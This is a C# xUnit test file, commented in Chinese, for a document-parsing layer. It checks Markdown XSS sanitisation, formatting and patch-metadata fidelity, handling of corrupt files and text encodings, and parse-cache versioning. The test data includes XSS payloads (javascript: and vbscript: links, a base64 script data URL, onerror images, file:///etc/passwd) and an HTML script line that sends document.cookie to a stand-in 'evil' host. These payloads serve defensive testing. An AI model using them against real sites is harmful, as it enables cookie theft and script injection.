using System.Text;
using System.Text.Json;
using Microsoft.EntityFrameworkCore;
using Workbench.Application;
using Workbench.Application.Services;
using Workbench.Documents;
using Workbench.Domain;

namespace Workbench.Tests;

/// <summary>
/// 文档解析层的语义与安全底线。
///
/// 三条线：
///   1. 渲染安全 —— agent 产出的 Markdown 不能带 XSS（危险 scheme / 裸 HTML）；
///   2. 语义保真 —— 删除线、强调、修订（作者 + 时间）不能丢；
///   3. 兜底 —— 损坏的文件、乱码、缓存过期都不能变成页面 500 或错误结果。
/// </summary>
public class DocumentSemanticsTests
{
    private readonly MarkdownDocumentParser _markdown = new();

    // ------------------------------------------------------------------
    // 一、渲染安全
    // ------------------------------------------------------------------

    [Theory]
    [InlineData("javascript:alert(document.cookie)")]
    [InlineData("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")]
    [InlineData("vbscript:msgbox(1)")]
    [InlineData("file:///etc/passwd")]
    public void 危险协议的链接被降级为纯文本(string url)
    {
        var html = MarkdownRenderer.ToHtml($"[点我]({url})");

        // 链接整个没了，只剩文字
        Assert.DoesNotContain("href=", html);
        Assert.DoesNotContain("<a ", html);
        Assert.Contains("点我", html);

        // scheme 也不能漏到输出里
        Assert.DoesNotContain("javascript:", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("vbscript:", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("data:text/html", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("file://", html, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void 协议相对链接不放行()
    {
        // //evil.com/x 看着像相对路径，实际会跳到外站
        var html = MarkdownRenderer.ToHtml("[点我](//evil.com/x)");

        Assert.DoesNotContain("href=", html);
        Assert.Contains("点我", html);
    }

    [Theory]
    [InlineData("https://example.com/a", "https://example.com/a")]
    [InlineData("http://example.com/a", "http://example.com/a")]
    [InlineData("mailto:someone@example.com", "mailto:someone@example.com")]
    public void 正常协议的链接保留(string url, string expected)
    {
        var html = MarkdownRenderer.ToHtml($"[点我]({url})");

        Assert.Contains("href=", html);
        Assert.Contains(expected, html);
        Assert.Contains("点我", html);
    }

    [Fact]
    public void 相对路径与页内锚点保留()
    {
        var relative = MarkdownRenderer.ToHtml("[需求](docs/spec.md)");
        Assert.Contains("href=\"docs/spec.md\"", relative);

        var anchor = MarkdownRenderer.ToHtml("[跳章](#section-2)");
        Assert.Contains("href=\"#section-2\"", anchor);
    }

    [Fact]
    public void 危险协议的图片被降级为纯文本()
    {
        var html = MarkdownRenderer.ToHtml("![图](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)");

        Assert.DoesNotContain("src=", html);
        Assert.DoesNotContain("<img", html);
        Assert.Contains("图", html);
    }

    [Fact]
    public void 用空白拆开的scheme也拦得住()
    {
        // 浏览器在判断 scheme 前会剥掉 URL 里的制表符与换行
        var html = MarkdownRenderer.ToHtml("[点我](<java\tscript:alert(1)>)");

        Assert.DoesNotContain("href=", html);
        Assert.Contains("点我", html);
    }

    [Fact]
    public void 裸HTML仍然被转义()
    {
        // AGENTS.md 规矩 #15：DisableHtml 不能去掉
        var script = MarkdownRenderer.ToHtml("<script>alert(1)</script>");
        Assert.DoesNotContain("<script>", script);
        Assert.Contains("&lt;script&gt;", script);

        var img = MarkdownRenderer.ToHtml("<img src=x onerror=alert(1)>");
        Assert.DoesNotContain("<img", img);
        Assert.Contains("&lt;img", img);
    }

    [Fact]
    public void 危险链接不会出现在解析结果的链接字段里()
    {
        var parsed = _markdown.Parse("[点我](javascript:alert(1))");

        var inline = parsed.Blocks.SelectMany(b => b.Inlines ?? []).Single();
        Assert.Null(inline.Link);
        Assert.Equal("点我", inline.Text);
    }

    // ------------------------------------------------------------------
    // 二、语义保真
    // ------------------------------------------------------------------

    [Theory]
    [InlineData("*斜体*", false, true)]
    [InlineData("**粗体**", true, false)]
    [InlineData("__粗体__", true, false)]
    [InlineData("_斜体_", false, true)]
    [InlineData("***粗斜***", true, true)]
    public void 强调按分隔符个数判断(string markdown, bool bold, bool italic)
    {
        var parsed = _markdown.Parse(markdown);

        var inline = parsed.Blocks.SelectMany(b => b.Inlines ?? []).Single();
        Assert.Equal(bold, inline.Bold);
        Assert.Equal(italic, inline.Italic);
    }

    [Fact]
    public void 删除线既进结构也进纯文本()
    {
        var parsed = _markdown.Parse("正常内容，~~已废弃~~，后续内容。");

        var struck = parsed.Blocks
            .SelectMany(b => b.Inlines ?? [])
            .Where(i => i.Strike)
            .ToList();

        Assert.Single(struck);
        Assert.Contains("已废弃", struck[0].Text);

        // 纯文本通道也要看得出这是废弃内容
        Assert.Contains("~~已废弃~~", parsed.PlainText);
    }

    [Fact]
    public void 补丁的新增行带新文件行号()
    {
        var lines = DiffTextParser.ParseLines("""
            @@ -10,7 +10,7 @@
             keep
            -old
            +new
            """);

        var context = lines.Single(l => l.Kind == DiffTextParser.Context);
        var removed = lines.Single(l => l.Kind == DiffTextParser.Removed);
        var added = lines.Single(l => l.Kind == DiffTextParser.Added);

        Assert.Equal(10, context.OldLine);
        Assert.Equal(10, context.NewLine);
        Assert.Equal(11, removed.OldLine);
        Assert.Equal(11, added.NewLine);
        Assert.Null(removed.NewLine);
        Assert.Null(added.OldLine);
    }

    [Fact]
    public async Task format_patch的作者与时间被解析出来()
    {
        var patch = """
            From 0123456789abcdef0123456789abcdef01234567 Mon Sep 17 00:00:00 2001
            From: 张三 <zhangsan@example.com>
            Date: Thu, 12 Nov 2026 15:04:00 +0800
            Subject: [PATCH] 修掉登录导出

            diff --git a/a.txt b/a.txt
            --- a/a.txt
            +++ b/a.txt
            @@ -1,3 +1,3 @@
             keep
            -old
            +new
            """;

        using var stream = new MemoryStream(Encoding.UTF8.GetBytes(patch));
        var parsed = await new DiffDocumentParser().ParseAsync(stream, "change.patch", CancellationToken.None);

        Assert.NotEmpty(parsed.Revisions);
        Assert.All(parsed.Revisions, r =>
        {
            Assert.Equal("张三 <zhangsan@example.com>", r.Author);
            Assert.NotNull(r.Date);
        });

        Assert.Equal(
            new DateTimeOffset(2026, 11, 12, 15, 4, 0, TimeSpan.FromHours(8)),
            parsed.Revisions[0].Date!.Value);
    }

    [Fact]
    public void 邮件头不会混进补丁正文()
    {
        var header = DiffTextParser.ParseFile("""
            From 0123456789abcdef0123456789abcdef01234567 Mon Sep 17 00:00:00 2001
            From: 张三 <zhangsan@example.com>
            Date: Thu, 12 Nov 2026 15:04:00 +0800

            diff --git a/a.txt b/a.txt
            --- a/a.txt
            +++ b/a.txt
            @@ -1,3 +1,3 @@
             keep
            -old
            +new
            """);

        Assert.Equal("张三 <zhangsan@example.com>", header.Author);
        Assert.NotNull(header.Date);
        Assert.DoesNotContain("From:", header.Body);
        Assert.StartsWith("diff --git", header.Body);
    }

    // ------------------------------------------------------------------
    // 三、兜底
    // ------------------------------------------------------------------

    [Fact]
    public async Task 损坏的docx不抛异常()
    {
        using var stream = new MemoryStream([0x00, 0x01, 0x02, 0x03, 0xFF, 0xFE, 0x42]);

        var parsed = await new DocxDocumentParser().ParseAsync(stream, "broken.docx", CancellationToken.None);

        Assert.Empty(parsed.Blocks);
        Assert.NotNull(parsed.Error);
        Assert.Contains("docx", parsed.Error);
    }

    [Fact]
    public async Task 损坏的pdf不抛异常()
    {
        using var stream = new MemoryStream([0x00, 0x01, 0x02, 0x03, 0x04, 0x05]);

        var parsed = await new PdfDocumentParser().ParseAsync(stream, "broken.pdf", CancellationToken.None);

        Assert.Empty(parsed.Blocks);
        Assert.NotNull(parsed.Error);
        Assert.Contains("pdf", parsed.Error);
    }

    [Fact]
    public async Task GBK文本按GB18030解码()
    {
        // "需求说明：用户登录后要能导出报表。" 的 GBK 字节
        byte[] gbk =
        [
            0xD0, 0xE8, 0xC7, 0xF3, 0xCB, 0xB5, 0xC3, 0xF7, 0xA3, 0xBA, 0xD3, 0xC3,
            0xBB, 0xA7, 0xB5, 0xC7, 0xC2, 0xBC, 0xBA, 0xF3, 0xD2, 0xAA, 0xC4, 0xDC,
            0xB5, 0xBC, 0xB3, 0xF6, 0xB1, 0xA8, 0xB1, 0xED, 0xA1, 0xA3
        ];

        using var stream = new MemoryStream(gbk);
        var parsed = await new PlainTextDocumentParser().ParseAsync(stream, "note.txt", CancellationToken.None);

        Assert.Contains("需求说明：用户登录后要能导出报表。", parsed.PlainText);
        Assert.DoesNotContain("\uFFFD", parsed.PlainText);
    }

    [Fact]
    public async Task 带BOM的UTF8文本正常解码()
    {
        byte[] withBom = [0xEF, 0xBB, 0xBF, .. Encoding.UTF8.GetBytes("正常内容")];

        using var stream = new MemoryStream(withBom);
        var parsed = await new PlainTextDocumentParser().ParseAsync(stream, "note.txt", CancellationToken.None);

        Assert.Contains("正常内容", parsed.PlainText);
    }

    [Fact]
    public void HTML里的脚本不进正文()
    {
        const string html = """
            <html>
            <head>
            <title>季度报告</title>
            <script>var x = 1; fetch('http://evil/'+document.cookie);</script>
            <style>.a{color:red}</style>
            </head>
            <body>
            <p>正文第一段</p>
            <p>正文第二段 &amp; 更多</p>
            </body>
            </html>
            """;

        var parsed = HtmlDocumentParser.Parse(html, "report.html");

        Assert.Equal("季度报告", parsed.Title);
        Assert.DoesNotContain("document.cookie", parsed.PlainText);
        Assert.DoesNotContain("var x = 1", parsed.PlainText);
        Assert.DoesNotContain("color:red", parsed.PlainText);

        Assert.Contains("正文第一段", parsed.PlainText);
        Assert.Contains("正文第二段 & 更多", parsed.PlainText);

        // 标题不该在正文里再出现一遍
        Assert.DoesNotContain("季度报告", parsed.PlainText);
    }
}

/// <summary>
/// 解析缓存与解析器版本。
/// </summary>
public class DocumentCacheVersionTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), "wb-doc-" + Guid.NewGuid().ToString("N"));

    [Fact]
    public async Task 解析器版本变了就不再命中旧缓存()
    {
        using var host = new WorkbenchTestHost();
        var (document, service) = await SetupAsync(host, "note.md", "# 新标题\n\n正文。");

        // 塞一条旧版本号的缓存：内容是假的，命中了就说明缓存没按版本走
        host.Db.DocumentParses.Add(new DocumentParse
        {
            DocumentId = document.Id,
            Format = DocFormat.Markdown,
            ParserVersion = 0,
            Json = JsonSerializer.Serialize(
                new ParsedDocDto("旧缓存", DocFormat.Markdown.ToString(), [], [], [], string.Empty),
                WorkbenchJson.Options),
            ParsedAt = host.Clock.UtcNow
        });
        await host.Db.SaveChangesAsync();

        var parsed = await service.ParseAsync(document.Id);

        Assert.Equal("新标题", parsed.Title);

        // 新写入的缓存用的是当前解析器版本
        var stored = await host.Db.DocumentParses
            .Where(p => p.DocumentId == document.Id)
            .ToListAsync();

        Assert.Contains(stored, p => p.ParserVersion == new MarkdownDocumentParser().ParserVersion);
    }

    [Fact]
    public async Task 版本一致时仍然命中缓存()
    {
        using var host = new WorkbenchTestHost();
        var (document, service) = await SetupAsync(host, "note.md", "# 新标题\n\n正文。");

        var first = await service.ParseAsync(document.Id);
        Assert.Equal("新标题", first.Title);

        // 把文件内容改掉：命中缓存的话结果不变
        await File.WriteAllTextAsync(Path.Combine(_root, "note.md"), "# 改过的标题");

        var second = await service.ParseAsync(document.Id);
        Assert.Equal("新标题", second.Title);

        // force 才会重新解析
        host.Clock.Advance(TimeSpan.FromSeconds(1));
        var forced = await service.ParseAsync(document.Id, force: true);
        Assert.Equal("改过的标题", forced.Title);
    }

    [Fact]
    public async Task 解析失败时错误信息进库而不是抛异常()
    {
        using var host = new WorkbenchTestHost();
        var (document, service) = await SetupAsync(
            host,
            "broken.docx",
            null,
            bytes: [0x00, 0x01, 0x02, 0x03, 0xFF, 0xFE]);

        var parsed = await service.ParseAsync(document.Id);

        Assert.NotNull(parsed.Error);
        Assert.Empty(parsed.Blocks);

        var stored = await host.Db.Documents.FirstAsync(d => d.Id == document.Id);
        Assert.False(stored.Parsed);
        Assert.NotNull(stored.ParseError);
    }

    private async Task<(Document Document, DocumentService Service)> SetupAsync(
        WorkbenchTestHost host,
        string fileName,
        string? content,
        byte[]? bytes = null)
    {
        Directory.CreateDirectory(_root);

        if (bytes is not null)
        {
            await File.WriteAllBytesAsync(Path.Combine(_root, fileName), bytes);
        }
        else
        {
            await File.WriteAllTextAsync(Path.Combine(_root, fileName), content ?? string.Empty);
        }

        var project = await host.Projects.CreateAsync("测试项目");
        var task = await host.Tasks.CreateAsync(project.Id, "测试任务");

        var document = new Document
        {
            TaskId = task.Id,
            FileName = fileName,
            StoredPath = fileName,
            SizeBytes = new FileInfo(Path.Combine(_root, fileName)).Length,
            ContentType = "text/plain",
            Format = fileName.EndsWith(".docx", StringComparison.OrdinalIgnoreCase)
                ? DocFormat.Docx
                : DocFormat.Markdown,
            UploadedAt = host.Clock.UtcNow
        };

        host.Db.Documents.Add(document);
        await host.Db.SaveChangesAsync();

        var registry = new DocumentParserRegistry(
        [
            new MarkdownDocumentParser(),
            new DocxDocumentParser()
        ]);

        var service = new DocumentService(host.Db, registry, new FakeDocumentStore(_root), host.Clock);

        return (document, service);
    }

    public void Dispose()
    {
        if (Directory.Exists(_root))
        {
            Directory.Delete(_root, recursive: true);
        }

        GC.SuppressFinalize(this);
    }

    private sealed class FakeDocumentStore(string root) : IDocumentStore
    {
        public Task<StoredFile> SaveAsync(
            Guid taskId,
            string fileName,
            Stream content,
            CancellationToken cancellationToken = default) =>
            throw new NotSupportedException("测试里不走落盘。");

        public string ResolveAbsolutePath(string relativePath) => Path.Combine(root, relativePath);

        public bool Exists(string relativePath) => File.Exists(Path.Combine(root, relativePath));
    }
}
